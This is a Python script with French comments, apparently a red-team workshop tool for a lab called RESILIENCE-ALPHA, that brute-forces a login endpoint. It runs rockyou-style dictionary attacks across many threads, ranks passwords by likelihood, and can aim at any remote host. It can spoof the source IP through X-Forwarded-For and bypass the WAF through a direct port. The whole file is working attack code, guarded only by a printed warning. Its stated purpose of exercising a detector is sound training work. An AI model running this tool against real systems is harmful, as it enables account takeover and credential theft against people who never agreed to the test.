#!/usr/bin/env python3
"""Attaque par dictionnaire (brute force) contre la connexion du labo RESILIENCE-ALPHA.

Deux commandes suffisent :

    cd attacks/attacks
    python3 lab.py                              # teste automatiquement en localhost
    python3 lab.py --host xx.xx.xx.xx/auth/v1/login   # vise un autre hote

Cible par defaut : le WAF local, `http://localhost/auth/v1/login`.
Le WAF retire le prefixe `/auth` avant de transmettre au service `auth`
(cf. `infra/compose/config/waf/waf_api_routes.conf`).

Le script optimise le sequencement pour aller vite sans perdre d'essai :
  - les tentatives sont reparties sur plusieurs fils (connexions HTTP persistantes) ;
  - le dictionnaire est classe par probabilite decroissante (chiffres purs, mot de base
    connu + suffixe, mots simples) : le bon mot de passe sort plus tot, mais l'ensemble
    du dictionnaire est toujours teste ;
  - chaque tentative est tracee dans un journal JSON (`.jsonl` pendant l'attaque,
    `.json` complet a la fin).

Mode campagne courte (declenchement deterministe du detecteur, sans dictionnaire) :

    python3 lab.py --direct --ip 203.0.113.66 --attempts 6 --email admin@resilience.local

Equivalent de la boucle cmd :

    for /L %i in (1,1,6) do curl -s -o nul -X POST http://localhost:3010/v1/login ^
      -H "Content-Type: application/json" -H "X-Forwarded-For: 203.0.113.66" ^
      -d "{\"email\":\"admin@resilience.local\",\"password\":\"mauvais\"}"

L'IP injectee n'est retenue que si la requete vient d'un proxy de confiance : passer par
`--direct` (port 3010) pour qu'elle soit comptee. Via le WAF, l'adresse reelle du client
est ajoutee en fin de X-Forwarded-For et c'est elle qui compte.

Outil Red Team du workshop : a n'utiliser que sur la plateforme de laboratoire.
"""

import argparse
import hashlib
import http.client
import json
import random
import re
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlsplit

HERE = Path(__file__).resolve().parent

DEFAULT_URL = "http://localhost/auth/v1/login"
DIRECT_URL = "http://localhost:3010/v1/login"
DEFAULT_TARGETS = HERE / "lab_targets.txt"
DEFAULT_WORDLISTS = [HERE / "rockyou.txt"]
DEFAULT_LOG_DIR = HERE / "logs"

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

# Statuts HTTP rencontres sur /v1/login, et ce qu'ils signifient pour l'attaque.
STATUS_OK = 200
STATUS_BAD_CREDENTIALS = 401
STATUS_BLOCKED = 403
STATUS_RATE_LIMITED = 429

# Bases de mots frequentes : un mot de passe construit sur l'une d'elles passe devant
# les autres au triage. Sert a classer le dictionnaire, pas a le reduire.
BASES_COURANTES = {
    "password", "pass", "passwd", "admin", "administrator", "azerty", "qwerty", "azertyuiop",
    "love", "lover", "lovely", "lovers", "secret", "monster", "letmein", "welcome",
    "shadow", "master", "michael", "jessica", "ashley", "daniel", "charlie", "thomas",
    "sunshine", "princess", "football", "baseball", "superman", "batman", "dragon",
    "monkey", "flower", "hello", "jesus", "nicole", "iloveu", "iloveyou", "loveme",
    "internet", "samsung", "killer", "cheese", "orange", "banana", "freedom", "starwars",
    "matrix", "whatever", "nothing", "money", "pizza", "juice", "harley", "ranger",
    "buster", "tigger", "ginger", "pepper", "summer", "winter", "spring", "autumn",
    "london", "paris", "france", "soleil", "bonjour", "carlos", "andrea", "jennifer",
    "joshua", "bubbles", "anthony", "soccer", "chocolate", "michelle", "butterfly",
    "purple", "angel", "jordan", "liverpool", "justin", "friends", "hannah", "rockyou",
    "girl", "boy", "man", "women", "men", "computer", "minecraft", "pokemon", "naruto",
    "abc", "trustno", "biteme", "hottie", "hotdog", "cookie", "kevin", "amanda", "george",
    "maggie", "heather", "taylor", "chelsea", "asdfgh", "zxcvbn", "trustme", "access",
}

# Nombre d'essais traces conserves dans le rapport JSON final.
MAX_TRACES = 20000


# --- Couleurs (desactivees si la sortie n'est pas un terminal) ---
class Palette:
    def __init__(self, enabled: bool) -> None:
        self.enabled = enabled

    def _wrap(self, code: str, text: str) -> str:
        return f"\033[{code}m{text}\033[0m" if self.enabled else text

    def green(self, text: str) -> str:
        return self._wrap("32", text)

    def red(self, text: str) -> str:
        return self._wrap("31", text)

    def yellow(self, text: str) -> str:
        return self._wrap("33", text)

    def blue(self, text: str) -> str:
        return self._wrap("34", text)

    def bold(self, text: str) -> str:
        return self._wrap("1", text)


# --- Chargement des listes ---
def load_wordlists(paths: list[Path]) -> list[str]:
    """Mots de passe dans l'ordre des fichiers, sans doublon ni ligne vide."""
    mots: list[str] = []
    vus: set[str] = set()
    for path in paths:
        if not path.exists():
            print(f"[!] liste de mots de passe introuvable : {path}", file=sys.stderr)
            continue
        with path.open(encoding="utf-8") as f:
            for ligne in f:
                mot = ligne.strip()
                if not mot or mot.startswith("#") or mot in vus:
                    continue
                vus.add(mot)
                mots.append(mot)
    return mots


def load_targets(path: Path) -> list[str]:
    """Comptes vises : un par ligne, dans un fichier."""
    if not path.exists():
        return []
    with path.open(encoding="utf-8") as f:
        return [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]


def classer_mots(mots: list[str]) -> list[str]:
    """Trie le dictionnaire par probabilite decroissante, sans en retirer aucun.

    Classes, de la plus probable a la moins probable :
      0. chiffres purs                 (123456)
      1. base connue + suffixe         (azerty123, password1)
      2. base connue seule              (password, princess)
      3. autre mot + suffixe            (iloveyou1)
      4. le reste                       (nawak, lolo2000)

    L'ordre de depart (rockyou est deja classe par frequence) sert de tie-breaker :
    a probabilite egale, le mot le plus prevalent reste devant.
    """
    def score(mot: str) -> int:
        base = re.sub(r"\d+[^0-9]*$", "", mot).lower()
        if mot.isdigit():
            return 0
        if base and base in BASES_COURANTES:
            return 1 if base != mot.lower() else 2
        if base and len(base) >= 4 and base.isalpha():
            return 3
        return 4

    return sorted(mots, key=score)


# --- Client HTTP a connexion persistante ---
class ClientHTTP:
    """Une connexion TCP maintenue ouverte et reutilisee : un seul handshake par fil."""

    def __init__(self, url: str, timeout: float, en_tetes: dict[str, str] | None = None) -> None:
        p = urlsplit(url)
        self.scheme = p.scheme or "http"
        self.host = p.hostname or "localhost"
        self.port = p.port or (443 if self.scheme == "https" else 80)
        self.path = p.path or "/"
        self.timeout = timeout
        self.en_tetes = dict(en_tetes or {})
        self._conn: http.client.HTTPConnection | None = None

    def _connect(self) -> http.client.HTTPConnection:
        if self.scheme == "https":
            self._conn = http.client.HTTPSConnection(self.host, self.port, timeout=self.timeout)
        else:
            self._conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        return self._conn

    def _close(self) -> None:
        if self._conn is not None:
            try:
                self._conn.close()
            except OSError:
                pass
            self._conn = None

    def post(self, body: bytes) -> tuple[int, str]:
        """POST JSON. Renvoie (statut HTTP, corps). Statut 0 = reseau injoignable."""
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": USER_AGENT,
            "Content-Length": str(len(body)),
            "Connection": "keep-alive",
        }
        headers.update(self.en_tetes)
        for essai in (1, 2):
            try:
                conn = self._conn or self._connect()
                self._conn = conn
                conn.request("POST", self.path, body=body, headers=headers)
                rep = conn.getresponse()
                return rep.status, rep.read().decode("utf-8", errors="replace")
            except (http.client.HTTPException, OSError) as e:
                # Connexion keep-alive fermee par le serveur : on repart sur une neuve.
                self._close()
                if essai == 2:
                    return 0, f"erreur reseau : {e}"
        return 0, "erreur reseau"


# --- Attaque ---
def lancer_attaque(
    url: str,
    comptes: list[str],
    mots: list[str],
    threads: int,
    delay: float,
    timeout: float,
    max_attempts: int | None,
    continue_after_success: bool,
    quiet: bool,
    palette: Palette,
    journal,
    en_tetes: dict[str, str] | None = None,
) -> dict:
    etats = {
        email: {
            "email": email,
            "found": False,
            "password": None,
            "attempts": 0,
            "statuses": {},
            "duration_seconds": 0.0,
            "first_attempt_at": None,
            "last_attempt_at": None,
            "first_success_at": None,
        }
        for email in comptes
    }

    # Les comptes sont entrelaces : les echecs se repartissent sur tous les comptes
    # vises, ce qui ressemble a une vraie campagne et donne au detecteur le meme signal.
    taches: list[tuple[str, str]] = []
    for mot in mots:
        for email in comptes:
            taches.append((email, mot))

    verrou = threading.Lock()
    curseur = {"i": 0}
    debut = time.monotonic()
    debut_iso = datetime.now(timezone.utc).isoformat()
    seq = {"n": 0}
    arret_global = threading.Event()
    blocages = {"consecutifs": 0}

    def worker() -> None:
        client = ClientHTTP(url, timeout, en_tetes)
        while not arret_global.is_set():
            with verrou:
                if curseur["i"] >= len(taches):
                    return
                i = curseur["i"]
                curseur["i"] = i + 1
                email, mot = taches[i]
                etat = etats[email]
                if etat["found"] and not continue_after_success:
                    continue
                if max_attempts is not None and etat["attempts"] >= max_attempts:
                    continue
                seq["n"] += 1
                numero = seq["n"]

            corps = json.dumps({"email": email, "password": mot}).encode("utf-8")
            t0 = time.perf_counter()
            statut, texte = client.post(corps)
            duree_ms = round((time.perf_counter() - t0) * 1000, 1)

            if statut == STATUS_OK and "access_token" not in texte:
                statut = 0
                texte = "reponse 200 sans jeton"

            with verrou:
                etat = etats[email]
                etat["attempts"] += 1
                moment = datetime.now(timezone.utc)
                if etat["first_attempt_at"] is None:
                    etat["first_attempt_at"] = moment.isoformat()
                etat["last_attempt_at"] = moment.isoformat()
                cle = str(statut) if statut else "network_error"
                etat["statuses"][cle] = etat["statuses"].get(cle, 0) + 1
                if statut == STATUS_OK:
                    etat["found"] = True
                    etat["password"] = mot
                    etat["first_success_at"] = moment.isoformat()
                # Trois refus d'affilee : l'IP est bloquee par le WAF, l'attaque est finie.
                if statut == STATUS_BLOCKED:
                    blocages["consecutifs"] += 1
                    if blocages["consecutifs"] >= 3:
                        arret_global.set()
                else:
                    blocages["consecutifs"] = 0
                trace = {
                    "seq": numero,
                    "at": moment.isoformat(),
                    "email": email,
                    "password": mot,
                    "status": statut if statut else None,
                    "outcome": _outcome(statut),
                    "elapsed_ms": duree_ms,
                }
                journal(trace)

            if not quiet:
                print(f"  {palette.blue('[' + str(numero).rjust(4) + ']')} {email} : "
                      f"{mot} -> {_libelle(statut, palette, texte)} ({duree_ms} ms)")

            if statut == STATUS_OK and continue_after_success:
                continue
            if statut == 0:
                # Cible injoignable : inutile de marteler le reste du dictionnaire.
                arret_global.set()
                break
            if delay > 0:
                time.sleep(delay)

    fils = max(1, min(threads, len(taches)))
    workers = [threading.Thread(target=worker, name=f"atk-{i}") for i in range(fils)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    duree_totale = round(time.monotonic() - debut, 2)
    for etat in etats.values():
        if etat["first_attempt_at"] and etat["last_attempt_at"]:
            t0 = datetime.fromisoformat(etat["first_attempt_at"])
            t1 = datetime.fromisoformat(etat["last_attempt_at"])
            etat["duration_seconds"] = round((t1 - t0).total_seconds(), 2)
    return {
        "etats": etats,
        "duree_totale": duree_totale,
        "debut_iso": debut_iso,
        "taches": len(taches),
    }


def _outcome(statut: int) -> str:
    if statut == STATUS_OK:
        return "success"
    if statut == STATUS_BAD_CREDENTIALS:
        return "invalid_credentials"
    if statut == STATUS_BLOCKED:
        return "blocked_by_waf"
    if statut == STATUS_RATE_LIMITED:
        return "rate_limited"
    if statut == 0:
        return "network_error"
    return f"http_{statut}"


def _libelle(statut: int, palette: Palette, texte: str = "") -> str:
    if statut == STATUS_OK:
        return palette.green("MOT DE PASSE TROUVE")
    if statut == STATUS_BAD_CREDENTIALS:
        return palette.red("401 identifiants invalides")
    if statut == STATUS_BLOCKED:
        return palette.red("403 bloque (WAF / ModSecurity)")
    if statut == STATUS_RATE_LIMITED:
        return palette.yellow("429 limite de debit")
    if statut == 0:
        return palette.red(f"injoignable ({texte})")
    return f"HTTP {statut}"


# --- Mode hors ligne : l'auto-test du dictionnaire (ancien comportement) ---
def mode_hors_ligne() -> int:
    with (HERE / "rockyou.txt").open(encoding="utf-8") as f:
        mots = [l.strip() for l in f if l.strip()]

    random.seed(42)
    comptes = {}
    for nom in ["alice", "bob", "charlie"]:
        mdp = random.choice(mots)
        comptes[nom] = hashlib.sha256(mdp.encode("utf-8")).hexdigest()

    with (HERE / "comptes.json").open("w", encoding="utf-8") as f:
        json.dump(comptes, f, indent=2)
    print("Comptes crees :", list(comptes.keys()))

    print("\n--- Attaque ---")
    total = 0
    for nom, h_attendu in comptes.items():
        trouve = False
        for m in mots:
            total += 1
            if hashlib.sha256(m.encode("utf-8")).hexdigest() == h_attendu:
                print(f"  [TROUVE] {nom} : {m}")
                trouve = True
                break
        if not trouve:
            print(f"  [ECHEC] {nom} : non trouve")
    print(f"Total comparaisons : {total}")
    return 0 if total else 1


# --- Programme principal ---
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Brute force par dictionnaire sur la connexion du labo RESILIENCE-ALPHA.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument(
        "--host",
        default=None,
        help="cible : hote, hote:port ou URL complete. Sans option : localhost via le WAF.",
    )
    p.add_argument(
        "--direct",
        action="store_true",
        help=f"attaquer le service auth sans le WAF ({DIRECT_URL})",
    )
    p.add_argument(
        "--email",
        action="append",
        default=[],
        help="compte vise (repetable). Sans option : la liste de lab_targets.txt",
    )
    p.add_argument(
        "--targets-file",
        type=Path,
        default=DEFAULT_TARGETS,
        help=f"fichier des comptes vises (defaut : {DEFAULT_TARGETS.name})",
    )
    p.add_argument(
        "-w",
        "--wordlist",
        action="append",
        type=Path,
        default=[],
        help="liste de mots de passe (repetable). Defaut : rockyou.txt",
    )
    p.add_argument(
        "--threads",
        type=int,
        default=24,
        help="tentatives en parallele (defaut : 24)",
    )
    p.add_argument("--delay", type=float, default=0.0, help="pause entre deux tentatives, en secondes")
    p.add_argument("--timeout", type=float, default=15.0, help="delai de reponse maximal, en secondes")
    p.add_argument(
        "--max-attempts",
        type=int,
        default=None,
        help="nombre maximal de tentatives par compte",
    )
    p.add_argument(
        "--continue-after-success",
        action="store_true",
        help="ne pas s'arreter au premier mot de passe trouve (teste tout le dictionnaire)",
    )
    p.add_argument(
        "--ip",
        default=None,
        help="IP source injectee dans X-Forwarded-For. Elle est retenue par le service "
             "auth uniquement si la requete vient d'un proxy de confiance (boucle locale) : "
             "utiliser --direct pour qu'elle soit prise en compte. Ignoree via le WAF.",
    )
    p.add_argument(
        "--attempts",
        type=int,
        default=None,
        help="mode campagne courte : nombre de tentatives a mot de passe fixe, sans dictionnaire "
             "(equivalent du for /L de cmd Windows). Le detecteur est declenche apres 5 echecs "
             "sur 120 s pour une meme IP.",
    )
    p.add_argument(
        "--password",
        default="mauvais-mot-de-passe",
        help="mot de passe utilise en mode --attempts (defaut : mauvais-mot-de-passe)",
    )
    p.add_argument(
        "--inject-db",
        action="store_true",
        help="simulation d'observation : ecrit directement les echecs dans login_attempts "
             "(docker exec db-auth). A utiliser quand l'IP source ne peut pas etre injectee "
             "dans X-Forwarded-For. Ce n'est pas une attaque : le signal est fabrique.",
    )
    p.add_argument(
        "--db-container",
        default="db-auth",
        help="conteneur PostgreSQL des tentatives (defaut : db-auth)",
    )
    p.add_argument(
        "--db-user",
        default="auth_user",
        help="utilisateur PostgreSQL (defaut : auth_user)",
    )
    p.add_argument(
        "--db-name",
        default="auth",
        help="base PostgreSQL (defaut : auth)",
    )
    p.add_argument("--quiet", action="store_true", help="ne pas afficher le detail des tentatives")
    p.add_argument(
        "--log-dir",
        type=Path,
        default=DEFAULT_LOG_DIR,
        help=f"dossier des journaux JSON (defaut : {DEFAULT_LOG_DIR.name}/)",
    )
    p.add_argument("--offline", action="store_true", help="auto-test hors ligne, sans reseau")
    return p.parse_args()


def build_url(host: str | None, direct: bool) -> str:
    """`--host 1.2.3.4`, `--host 1.2.3.4/auth/v1/login` ou une URL complete."""
    if direct:
        return DIRECT_URL
    if not host:
        return DEFAULT_URL
    cible = host.strip().rstrip("/")
    if not cible.startswith(("http://", "https://")):
        cible = "http://" + cible
    p = urlsplit(cible)
    if not p.path or p.path == "/":
        cible = cible.rstrip("/") + "/auth/v1/login"
    return cible


def commandes_verification(ip: str) -> str:
    """Commandes a lancer sur le PC Hote pour verifier la chaine complete."""
    return "\n".join([
        "# 1. l'IP a-t-elle ete enregistree par le service auth ?",
        "docker exec db-auth psql -U auth_user -d auth -c \""
        "select ip, count(*), max(created_at) from login_attempts "
        f"where created_at > now() - interval '3 minutes' group by ip;\"",
        "",
        "# 2. le detecteur a-t-il cree l'incident ?",
        "docker exec db-remediation psql -U remediation_user -d remediation -c \""
        "select type, source_ip, status, created_at from incidents "
        "order by created_at desc limit 3;\"",
        "",
        "# 3. l'IP est-elle dans la liste de deni du WAF ?",
        "docker exec waf sh -c \"cat /etc/nginx/denylist/*.conf 2>/dev/null || echo 'liste vide'\"",
        "",
        f"# (l'IP cherchee : {ip})",
    ])


def injecter_observations(
    ip: str,
    email: str,
    nombre: int,
    conteneur: str,
    utilisateur: str,
    base: str,
) -> int:
    """Ecrit des echecs de connexion observes dans login_attempts (simulation)."""
    sql = (
        "insert into login_attempts (id,email,user_id,ip,success,reason,created_at) "
        "select gen_random_uuid(), '{email}', null, '{ip}', false, 'bad_password', "
        "now() - (g || ' seconds')::interval from generate_series(0,{n}) g;"
    ).format(email=email.replace("'", "''"), ip=ip.replace("'", "''"), n=max(1, nombre) - 1)

    commande = ["docker", "exec", conteneur, "psql", "-U", utilisateur, "-d", base, "-c", sql]
    try:
        resultat = subprocess.run(commande, capture_output=True, text=True, timeout=30)
    except FileNotFoundError:
        print("[!] docker introuvable sur cette machine", file=sys.stderr)
        return 2
    except subprocess.TimeoutExpired:
        print("[!] la commande docker a expire", file=sys.stderr)
        return 2

    if resultat.returncode != 0:
        print(f"[!] injection refusee : {resultat.stderr.strip()}", file=sys.stderr)
        return 2
    sortie = resultat.stdout.strip()
    if sortie:
        print(sortie)
    return 0


def main() -> int:
    args = parse_args()
    if args.offline:
        return mode_hors_ligne()

    palette = Palette(sys.stdout.isatty())
    url = build_url(args.host, args.direct)
    mode_campagne = args.attempts is not None

    if args.inject_db:
        if not args.ip:
            print("[!] --inject-db exige --ip <adresse a simuler>", file=sys.stderr)
            return 2
        nombre = args.attempts or 6
        email = (args.email or ["victim@resilience.local"])[0]
        print(palette.yellow("[*] Simulation d'observation : les echecs sont ecrits directement"))
        print(palette.yellow("    dans login_attempts. Ce n'est pas une attaque reelle :"))
        print(palette.yellow("    le signal du detecteur est fabrique, l'IP non."))
        print()
        sys.stdout.flush()
        code = injecter_observations(
            args.ip, email, nombre, args.db_container, args.db_user, args.db_name
        )
        if code != 0:
            return code
        print()
        print(commandes_verification(args.ip))
        return 0

    if mode_campagne:
        # Campagne courte : un mot de passe faux repete N fois. Pas de dictionnaire.
        mots = [args.password] * max(1, args.attempts)
    else:
        mots = classer_mots(load_wordlists(args.wordlist or DEFAULT_WORDLISTS))
    comptes = args.email or load_targets(args.targets_file)

    if not mots:
        print("[!] aucune liste de mots de passe exploitable", file=sys.stderr)
        return 2
    if not comptes:
        print(f"[!] aucun compte vise (utiliser --email ou --targets-file {args.targets_file})", file=sys.stderr)
        return 2
    if mode_campagne:
        comptes = comptes[:1]
        # Serie sequentielle : la campagne courte imite une boucle, pas un tir de charge.
        args.threads = 1

    en_tetes: dict[str, str] = {}
    if args.ip:
        en_tetes["X-Forwarded-For"] = args.ip

    horodatage = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    args.log_dir.mkdir(parents=True, exist_ok=True)
    journal_chemin = args.log_dir / f"attaque_{horodatage}.jsonl"
    rapport_chemin = args.log_dir / f"attaque_{horodatage}.json"

    traces: list[dict] = []
    journal_fichier = journal_chemin.open("w", encoding="utf-8")
    journal_verrou = threading.Lock()

    def journal(trace: dict) -> None:
        with journal_verrou:
            traces.append(trace)
            journal_fichier.write(json.dumps(trace, ensure_ascii=False) + "\n")
            journal_fichier.flush()

    print(palette.bold(f"[*] Cible  : {url}"))
    print(f"[*] Comptes : {', '.join(comptes)}")
    if mode_campagne:
        print(f"[*] Mode   : campagne courte, {args.attempts} tentatives a mot de passe fixe")
    else:
        print(f"[*] Dictionnaire : {len(mots)} mots de passe (classes par probabilite)")
    if args.ip:
        print(f"[*] IP injectee : {args.ip} (X-Forwarded-For)")
    print(f"[*] Cadence : {args.threads} fils, {args.delay}s entre deux tentatives")
    print(f"[*] Journal : {journal_chemin}")
    if not urlsplit(url).hostname in ("localhost", "127.0.0.1", "::1"):
        print(palette.yellow("[!] Cible distante : a n'utiliser que sur le labo autorise."))
    if args.ip and not args.direct and (url == DEFAULT_URL or urlsplit(url).port in (None, 80)):
        print(palette.yellow(
            "[!] IP injectee et cible via le WAF : le WAF ajoute l'adresse reelle a la fin "
            "de X-Forwarded-For, c'est elle qui sera comptee. Utiliser --direct."
        ))
    print()

    resultat = lancer_attaque(
        url,
        comptes,
        mots,
        args.threads,
        args.delay,
        args.timeout,
        args.max_attempts,
        args.continue_after_success,
        args.quiet,
        palette,
        journal,
        en_tetes,
    )
    journal_fichier.close()

    etats = resultat["etats"]
    duree = resultat["duree_totale"]
    total = sum(e["attempts"] for e in etats.values())
    trouves = [e for e in etats.values() if e["found"]]
    statuts: dict[str, int] = {}
    for e in etats.values():
        for k, v in e["statuses"].items():
            statuts[k] = statuts.get(k, 0) + v

    print()
    print(palette.bold("--- Bilan ---"))
    for e in etats.values():
        etat = (
            f"{palette.green('MOT DE PASSE TROUVE')} : {e['password']}"
            if e["found"]
            else palette.red("mot de passe non trouve")
        )
        print(f"  {e['email']} : {etat} ({e['attempts']} tentatives, statuts {e['statuses']})")
    print(f"Total tentatives : {total} en {duree}s "
          f"({round(total / duree, 1) if duree else 0}/s)")
    if total and statuts.get("network_error", 0) == total:
        print(palette.red(f"[!] Cible injoignable : {url}"))

    rapport = {
        "outil": "resilience-alpha / red team - brute force par dictionnaire",
        "cible": {
            "url": url,
            "hote": urlsplit(url).hostname,
            "port": urlsplit(url).port,
            "mode": "direct" if args.direct else ("waf" if args.host is None else "waf"),
            "ip_injectee": args.ip,
        },
        "options": {
            "threads": args.threads,
            "delay": args.delay,
            "timeout": args.timeout,
            "max_attempts": args.max_attempts,
            "continue_after_success": args.continue_after_success,
            "comptes": comptes,
            "taille_dictionnaire": len(mots),
            "mode_campagne": mode_campagne,
        },
        "resume": {
            "debut": resultat["debut_iso"],
            "fin": datetime.now(timezone.utc).isoformat(),
            "duree_secondes": duree,
            "tentatives": total,
            "tentatives_par_seconde": round(total / duree, 1) if duree else 0,
            "statuts": statuts,
            "comptes_compromis": [e["email"] for e in trouves],
        },
        "resultats": list(etats.values()),
        "journal_complet": journal_chemin.name,
        "traces": traces[:MAX_TRACES],
    }
    rapport_chemin.write_text(json.dumps(rapport, indent=2, ensure_ascii=False), encoding="utf-8")

    print(f"Journal des tentatives : {journal_chemin}")
    print(f"Rapport JSON           : {rapport_chemin}")

    if trouves:
        print(palette.green("[*] Attaque reussie : identifiants valides obtenus."))
        return 0
    if mode_campagne:
        print(palette.yellow(
            f"[*] Campagne terminee : {total} tentatives refusees depuis "
            f"{args.ip or urlsplit(url).hostname}."
        ))
        print()
        print(commandes_verification(args.ip or urlsplit(url).hostname or "?"))
        return 0
    print(palette.red("[*] Attaque echouee : aucun couple email / mot de passe valide."))
    return 1


if __name__ == "__main__":
    sys.exit(main())
